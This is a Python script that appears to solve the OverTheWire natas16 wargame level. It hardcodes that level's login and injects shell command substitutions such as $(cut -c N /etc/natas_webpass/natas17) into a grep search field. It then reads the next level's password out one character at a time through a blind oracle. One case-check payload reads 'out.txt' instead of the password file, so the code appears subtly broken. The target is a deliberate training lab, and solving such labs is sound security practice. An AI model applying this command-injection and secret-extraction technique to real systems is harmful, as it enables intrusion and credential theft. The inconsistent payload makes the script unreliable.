from base64 import b64encode

import requests

idx = 1
pw = ''
url = 'http://natas16.natas.labs.overthewire.org/index.php'
userAndPass = b64encode(b"natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh").decode("ascii")
headers = {'Authorization': 'Basic %s' % userAndPass}

def getMatch(needle):
    res = requests.post(url, headers=headers, data={'needle': needle})
    return res.text.splitlines()[22]


while idx < 32:
    print("looking for %i" % idx)
    # grep -i "^$(cut -c{idx} /etc/natas_webpass/natas17)" dictionary.txt
    match = getMatch("^$(cut -c%i /etc/natas_webpass/natas17)" % idx)
    if match == '</pre>':
        print(f"resolving number")
        # generates one . too much, 1 is minimum.
        # ergo: a 0 outputs .
        match = getMatch("^$(printf .%.0s $(seq 0 $(cut -c"+str(idx)+" /etc/natas_webpass/natas17)))$")
        print("mapping length of %s to number" % match)
        match = str(len(match)-1)
    else:
        # alpha char matched, but case not known yet
        match = match[0]
        # printf %d \'A => ' is not allowed
        # echo a | od -A n -t d1 => pipe not allowed
        # ^$(printf .%.0s $(( ord($(cut -c"+str(idx)+" /etc/natas_webpass/natas17)) / 10 )))$") # => len(withCase[0]) in (6,7,8,9) ? upper : lower

        caseMatch = getMatch("^$(echo $([[ $(cut -c%i out.txt) =~ ^[a-z]$ ]] && echo . || echo ..))$" % idx)
        print(f"caseMatch {caseMatch}")
        match = match.lower() if len(caseMatch) == 1 else match.upper()
    pw += match
    print(pw)
    idx += 1
